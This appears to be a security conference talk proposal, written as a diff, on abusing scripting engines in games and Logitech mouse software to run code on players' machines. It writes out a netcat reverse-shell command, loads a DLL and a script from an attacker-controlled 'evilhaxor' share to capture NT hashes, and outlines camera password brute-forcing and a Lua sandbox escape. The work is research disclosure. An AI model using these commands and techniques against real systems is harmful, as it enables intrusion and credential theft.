@@ -1,0 +1,124 @@
+========
+Abstract
+========
+Everybody plays games, and a whole lot of people plays computer games. Despite this fact, very few of us, security researchers consider them as interesting targets. Granted, you won't likely be able to directly hack into a big corporate network via game exploits, but you could for example target the people running the company via their favorite games. Or their children's favorite games. Another scenario: you should consider that a hacked game could allow Not So Admirable people access to your internal network - which at first does not seem that big of a deal considering it's "just" a home network, but when you realize all your mobile phones, your TV set, your VOIP phones, your security cameras, and even your smart house sensors and controllers are part of that network, it looks much more scary.
+Games are also interesting from a technical standpoint too, since they tend to be quite complex. The majority of them have networking, and they process complex data structures (maps, saved games, etc.) which makes them ideal fuzzing targets. But this talk is not about those kind of exploits. Hackers tend to ignore the low hanging fruits in favor of beautiful exploits, but we really shouldn't - bad guys don't care about how sophisticated some exploit is, they only care about the results. This is why I have decided to take a look around and see what's already there in the games that allows access to the gamers' network. Thus this research about how game scripting engines can be abused started.
+I'll show in this talk that playing on custom game servers and playing community created maps could easily lead to code execution on our machines - more so, in most cases without the need to bypass the operating system's exploit mitigation techniques. My targets include popular games and game engines like CryEngine 3, Dota 2, Garry's Mod, ARMA3 and Digital Combat Simulator. I'll show a wide range of script abuse from a simple direct command execution in an unrestricted scripting environment through brute forcing a security camera via HTTP requests to complex script sandbox escapes.
+
+===========
+Speaker Bio
+===========
+Tamas is the lead IT security researcher at PR-Audit Ltd., a company focusing mainly on penetration testing and SIEM software developing. Previously he participated in a cooperation between ELTE Department of Meteorology and the Paks Nuclear Power Plant Ltd. which goal was to develop TREX, a toxic waste emission simulator using CUDA. The scene from RoboCop where the kid defeats the evil robot with just a laptop and a serial cable made a huge impression on him, and after seeing the movie, his path was set: he was bound to be a hacker. His first experiences in this field involved poking around various copy protection schemes, and for this day his favorite areas of expertise are the ones that require some mangling of binary files. Besides computer security he also loves mountain biking and flight simulators.
+
+================
+Detailed Outline
+================
+
+1. Intro
+	1.1. Who?
+		I'll make a brief introduction:
+        	- Tamas Szakaly from Hungary
+        	- security researcher at an IT security company called PR-AUDIT Ltd.
+        	- Cyberlympics 2012 European Champion
+        	- OSCE
+        	- a "binary guy": loves crackmes and copy protections
+        	- Prefer cute daemons over birds, fruits and windows.
+        	- Despite the previous fact I have to make a confession: I am a pervert, I *LOVE* the Win32 API with all its dirty little secrets and quirks (this will be somewhat important later in the talk)
+
+	1.2. What, why?
+
+		In this part I'll give a brief introduction about what this talk is about, and why I choose to do the research described here. Basically this part will elaborate on the abstract's content. I'll also tell at the beginning that after this intro part the talk will consist of live demos where I'll exploit five different games and one gaming mouse.
+
+		1.2.1 Modding in general
+			I'll talk about how "modding" always played a big role in gaming communities, and there are lots of user generated content available on the Internet for a lot of games. Also, nowadays there are "official" places where users can share their content and even get paid for it (e.g. Steam Workshop). The goal of this part is to show that user generated content for games are out there, people download and use them, so this whole topic is not some abstract speculation, but a very real thing.
+
+		1.2.2. Multiplayer
+			Nowadays nearly all games support some kind of multiplayer mode. This is interesting from a security standpoint, since there is a constant information exchange between the server and client that involves rather complex data structures. For example when a game server uses a custom map/level, it is downloaded and processed on the gamer's machine upon connecting to that server. So this basically means that a server controls big amount of complex data that is parsed, processed on the client side. Also, the communication between server and client is generally done using a custom protocol. These facts make multiplayer games ideal fuzzing targets. This is the part where I'll show that ReVuln did a research on this topic, and made an excellent paper/talk about game engine 0days (http://revuln.com/files/ReVuln_Game_Engines_0days_tale.pdf) in 2013.
+
+		1.2.3. Scripting
+			I'll explain that lots of games incorporate some kind of scripting engine that can be used to control the A.I., the game flow, the environment (spawn/destroy things), administrate a game server (kick/ban users), etc. Often these scripting engines are accessible for those who generate custom content, e.g. scripts can be embedded into custom maps, and these scripts will run on the client side when playing on downloaded maps, or connecting to servers. These script API's are in a lot of cases too permissive, or have poorly implemented sandboxes, which makes it easy to abuse them. This kind of exploitation has a very big advantage over exploiting memory corruptions and such: generally we don't have to bother with the operating system's exploit mitigation techniques. That said, I'll mention that since I don't want to disappoint folks who love hacking that involves some disassembling and memory mangling, my last demo will surely satisfy them.
+
+		1.2.4. Precedents, and why is this really important
+			Exploiting scripting in games is not a new thing, there are lots of references on the Internet about such things. I'll talk about the Garry's Mod exploits in the past few years that got relatively big coverage in gaming media, and also about an ARMA3 exploit that was used to steal the server's configuration file. This brings us to an important observation: game exploits are usually used to cheat in games, and nobody talks about the fact that exploiting a game gives access to the gamers' internal network that contains more and more components nowadays (routers, phones, security cameras, TV sets, smart house components, etc.)
+
+2. The exploits
+	2.1. When you are the bad guy (ARMA3)
+		This part is different from the rest of the talk in two ways:
+ 		 - It describes a vulnerability that allows the clients to attack the server, not the other way around.
+ 		 - It is not really a scripting engines issue, rather a dangerous feature in the game. I've included this issue despite this fact because I think it is really interesting.
+
+		This part is about the game ARMA3, which is a military combat simulator game. Naturally you can play multiplayer, and you also can have your own groups called squads. These squads can have a name, a logo, etc., and these will be displayed on every server you connect to. How this is achieved? In your profile you can set an HTTP or FTP URL that points to an XML file containing your squad information. Last year I did a research and talk about exploiting XML vulnerabilities, so when I first read about this feature, I was naturally hoping for an XXE, but it didn't work. 
+		Anyways, this is still interesting, since you, the client, can make the server issue arbitrary HTTP GET requests - which essentially means, that we have an HTTP proxy to the server's internal network. The first demo in this part is based on a scenario from real life: an ARMA3 server owner had a local-only accessible stat system that used a vulnerable component (PHP-Charts) that could be exploited via a single HTTP GET request to get a remote shell on the server. (DEMO #1)
+
+		After the demo I'll mention that there is also a script function in ARMA that is capable of generating arbitrary HTTP GET requests called "htmlLoad". This means that a malicious server could make the connecting clients send out GET requests. This is, however, not easily exploitable, since there is no way for the attacker to read the response. Despite this, one can still use this function for malicious purposes: e.g. a server can use it's clients to participate in a DDoS attack. This section about "htmlLoad" prepares the ground for the next exploit: I will describe an almost identical situation in another game with the notable exception that we have much more control over the HTTP request (e.g. we can POST or even PUT, not just GET), and we can see the response, too.
+
+	2.2. Spy game (Garry's Mod)
+		In the previous part I've shown how to make an ARMA3 server to issue arbitrary HTTP GET requests. The fact that we can use only GET requests limits our possibilities. But there are games where you have script API functions that lets you do arbitrary HTTP request including not only POST, but PUT and DELETE too! Garry's Mod is such a game.
+		Garry's Mod uses Lua as a scripting engine, and it had it's share of Lua-based vulnerabilities in the past few years. I'll refer to the exploits shown in the "Precedents" section in the intro, and I'll show some of the mitigation techniques used by Garry:
+		  - proper Lua sandbox
+		  - restricted file I/O (directory traversal was possible, now it isn't)
+		  - own implementation for dangerous function (e.g. package.loadlib)
+
+		All these past exploits made GMod quite secure against direct exploitation, but there are still some API functions that can be abused. In this demo I'll have a malicious game server that finds HTTP servers on every connecting client's home network, and tries to brute force HTTP basic authentication passwords. There will be a TP-Link TL-SC2020 camera attached to my laptop, and after successfully brute-forcing the password, I'll steal live images (jpg) and image streams (mjpg) from the camera using Garry's Mod. (DEMO #2)
+
+	2.3. No sandbox in Sandbox (CryEngine3)
+		CryEngine also uses Lua as a scripting engine. This demo is the most simple one in this talk - since there is no Lua sandbox in place whatsoever, you can use any Lua function calls. Yes, you can also call "os.execute", which does exactly what it name implies: it executes commands. I'll show this using a malicious Crysis 2 level with a Big Red Button that executes a netcat executable from a Windows share when pressed using the following code: "os.execute("\\\\evilhaxor\\a\\nc.exe -e cmd.exe 192.168.0.13 1337")" (DEMO #3.1) Here, I'll refer to the part where I've mentioned that I love Win32, and explain why: Lua on Windows obviously uses the Win32 APIs to do its stuff, and all Win32 APIs that has to do something with files and file paths accepts UNC paths. This means, that you can for example call "ShellExecute" or "LoadLibrary" using a SMB share as path.
+		This has another interesting side effect: if your target game has a scripting engine that have some file open API, you can most likely steal the user's NT hashes. I'll show this by starting an MSF auxiliary/capture/server/smb module on the attacker machine, and calling dofile("\\\\evilhaxor\\something") from the map used in the previous demo opened in CryEngine3. (DEMO #3.2)
+
+	2.4 From crash to exploit (DCS World)
+		Digital Combat Simulator is a modular flight simulator that also uses Lua as a mission scripting engine. The mission scripting environment is somewhat limited, since mission scripts run in a sandbox. I'll show the code that implements this sandbox. It is very short and straightforward, so I plan to make a quiz out of it: the first one who spots the error in the sandbox code, gets a bottle of Hungarian palinka. If nobody in the room speaks Lua, there's a high chance nobody will find the error - in this case I'll just ask another question which should be easily answered (I'm not yet sure what it will be).
+		After we've discussed what is wrong with the sandbox code (it disables "loadlib" instead of "package.loadlib"), I'll demonstrate this error by connecting to a server serving a malicious mission that has a script attached to the "crashed" event that calls "package.loadlib("\\\\evilhaxor\\a\\PopCalc64.dll", "dummy"). This will load PopCalc64.dll (a DLL that starts calc.exe when attached to a process) from "evilhaxor", and Calculator will start when the aircraft crashes. (DEMO #4)
+
+	2.5. The tale of a DLL hijacking kobold (Dota2)
+		Another Lua-scriptable game, Dota2. This time we are somewhat restricted by a sandbox, for example we can't call "os.execute" or load DLLs with "package.loadlib". I'll show how to search for the interesting Lua functions and tables via the game console. As it turns out, this Lua sandbox has a huge shortcoming: the stock io library is accessible. I'll demonstrate a possible exploitation technique using the "barebones" mod that comes with the Dota2 Workshop Tools. I'll modify the stock scripts so it will contain a modified "dota.exe" as a Base64-encoded string, which will be decoded and written to the game directory when an NPC spawns. This way when the game starts, it will execute our code (and spawn a Calculator). (DEMO #5)
+		I'll also mention that access to the io library allows a lot more possibilities, of which I'll mention a few:
+		  - we can steal files from clients' computers
+		  - we can use the SMB NT hash trick from the previous demo
+		  - we can deploy autorun batch scripts
+
+	2.6. You should be afraid of mice (Logitech Gaming Software)
+		This part is not about a game, but a gaming mouse. All G-series Logitech peripherals (keyboards, mice and headsets) have a Lua script attached to their profile in Logitech Gaming Software. These profiles are export/importable, and gamers can share them on the Internet. The Lua environment is tightly sandboxed, but it is still possible to escape and run commands on the machine. The sandbox enables you to use the "string.dump" and the "loadstring" LUA functions. This makes it possible to dump functions as Lua bytecode, modify them and then load the modified bytecode as functions. Based on Corsix's awesome ideas demonstrated in his Company of Heroes 2 exploit (https://gist.github.com/corsix/6575486), I've created a proof of concept code that escapes the Lua sandbox and starts Calculator. I'll explain Corsix's ideas, and show the difference between his PoC code and mine (this will be the most technical part of the talk, it involves stuff like how C structs are represented in memory, what is IAT and how a PE image looks like, how ASLR works on Windows, what kind of calling convention Win64 uses, and of course the inner workings of the Lua VM).
+
+		Before explaining the exploit code, I'll load it in Logitech Gaming Software, make a middle click that will trigger the code, and Calculator will start. (DEMO #6) After the demo I'll explain how the exploit works.
+
+		A very brief explanation of the technical details of the PoC code (these will be detailed during the talk, and the final PoC is attached to this mail): As Corsix has shown, modifying, or hand-writing Lua bytecode allows us two things: we can get the memory address of any Lua variables as a double precision floating point number, and we can hand-craft arbitrary Lua variables. These combined essentially mean that we have an arbitrary memory read/write. He uses these two tricks to create a CClosure (which basically is an object pointing to a native function), and change its original function pointer ("luaB_auxwrap") to "ll_loadlib", the native function "package.loadlib" uses to load DLL files. My exploit for LGS is different in two major aspects:
+
+		  - My exploit is for the 64bit version of the software.
+		  - I call "system" directly, not "LoadLibrary" through "ll_loadlib".
+
+		The 64bit vs. 32bit issue shows itself in different memory layouts (struct packing), different calling conventions, and the obvious difference between pointer sizes. This actually makes exploitation easier on 64bit, since sizeof(double) and sizeof(void*) is the same, and - as I've said earlier - we're getting Lua object pointers as doubles.
+
+		The reason behind the other difference is that Lua can be compiled in a way that only ANSI functionality is allowed. In this case, "ll_loadlib" is only a stub, and does not actually work, so we cannot use that to load a DLL. This is why I'll call "system" from MSVCR directly. A Lua CClosure's function pointer points to a function that has one parameter, a pointer to the actual Lua state. "system" has one parameter, a pointer to a string. So basically I have to overwrite the Lua state with the executable name ("calc.exe"), the CCLosure's function pointer with a pointer to "system"'s IAT entry address, and call the CCLosure. There are a few tricks involved to achieve successful exploitation:
+
+		  - We have to reliable get the address of the current Lua state. This is done by calling coroutine.running, which returns the Lua state when called from a coroutine. Because of this the exploit code has to be wrapped in a coroutine.
+		  - I experienced a lot of seemingly random crashes that turned out to be because of the event handler code is run with debug hook attached by default. This has to be disabled.
+		  - To prevent further crashes, two additional things has to be done:
+		    - The garbage collector has to be stopped.
+		    - The overwritten Lua state has to be restored.
+
+		There is one restriction with this approach: we can overwrite only 16 bytes of the Lua state, so the executable path's length must be <= 15 (+1 null byte). I'll show that this not really is a problem, since we can use UNC paths, and we can even omit the ".exe", and use something like this: "\\evilhaxor\a\e", where "e.exe" is an arbitrary executable. This means that we have 9 characters for a NETBIOS name (if we are on the same network as the victim), or for a IP address/domain name - which is quite feasible - and we can run virtually anything on our victim's computer.
+
+3. Outro
+I'll answer the question that is the title of this talk: of course we shall, but we should do it knowing that connecting to a malicious server, or using a downloaded map or mission can do harm to our computer and us. So yes, we should be security conscious even when we are just playing games. I'll also mention that game developers should be security conscious too, and they should really think through what functionality they give access to via the scripting APIs incorporated into their products.
+
+================
+Supporting Files
+================
+
+The supporting_files.zip archive attached to this submission contains the following files.
+ 
+  - demo2_gmod_poc.zip: A Garry's Mod game mode that have two console commands:
+  	  - "hck_scanplayers" scans typical home network subnets (192.168.0.0/24 and 192.168.1.0/24 for this PoC) for HTTP servers, and sends the results to the server's console.
+  	  - "hck_getimage" downloads an image from a TL-SC2020 security camera on the victim's network, and displays it in-game.
+  	The "test" folder should be placed to "<GarrysMod folder>\garrysmod\gamemodes". The actual code files (base64.lua, init.lua, cl_init.lua and sv_init.lua) are in the "test\gamemode" folder.
+
+  - demo3_crysis2_poc.zip: A Crysis 2 mod that contains one level (TheBigRedButton) with a big red button that launches a Calculator when pressed. The "HackThePlanet" folder should be placed to "<Crysis 2 folder>\Mods\". The actual code is in the "HackThePlanet\GameCrysis2\Scripts\Entities\Button.lua" file.
+
+  - demo4_dcswolrd_poc.miz: A DCS World mission that puts you into the cockpit of a TF-51D, and loads a DLL from the following Samba share: "\\evilhaxor\a\PopCalc64.dll" when you finally crash :) The ".miz" file should be placed to "%userprofile%\Saved Games\DCS\Missions". The ".miz" is a simple Zip archive, and the actual code can be found at the 7th line of the file named "mission" in this archive.
+
+  - demo5_dota2_poc.zip: A Dota 2 mod that decodes a minimal application that starts Calculator (calc.exe itself is too large for this, having a nearly 1MB size) from a Base64-encoded string variable, and replaces the original "dota.exe" with it. The "barebones" folder should be placed to "<Dota 2 folder>\dota_ugc\content\dota_addons". The actual exploit code starts at the 335th line of "barebones\scripts\vscripts\barebones.lua"
+
+  - LGS_PoC.xml: a Logitech Gaming Software profile made for a G402 mouse. When it is imported into LGS and activated (the profile is attached to notepad.exe, so every time Notepad runs, it is automatically activated), every middle click (actually the middle button release) will open a Calculator. The actual Lua exploit code starts at line 534 in the XML.
+
+These are mostly simplified, stripped down proof of concepts, the demonstrations during the talk will be more complete (also, I plan to be more creative and change some of the Calculators to something else). This is especially true for the Garry's Mod and the Dota 2 demos. I intend to build more automatisms into the Garry's Mod one, and perhaps a basic portscanner and some sort of HTTP proxy framework. Also, the brute force part is missing from this PoC - that part of the code is too messy, and I don't want to wait with my CFP application until I clean it up. The Dota 2 now simply replaces "dota.exe" with another executable, but for the demonstration it will be a patched "dota.exe" that runs our code while leaves the game playable. Also, the code will be triggered by interacting with some object on the map, not by spawning NPCs, and of course it will be in-game, not in-editor.
+I've also made videos of these proof of concepts. A .zip containing these videos can be downloaded from the following URL: https://www.dropbox.com/s/toitz0klj0bwiqk/poc_videos.zip?dl=0 . The password for the zip is "2no0C1d3f5". (Note: the videos were made in single player mode for simplicity, but the demonstrations will be multiplayers to make it clear that the only thing a victim has to do to get hacked is to connect a malicious server).
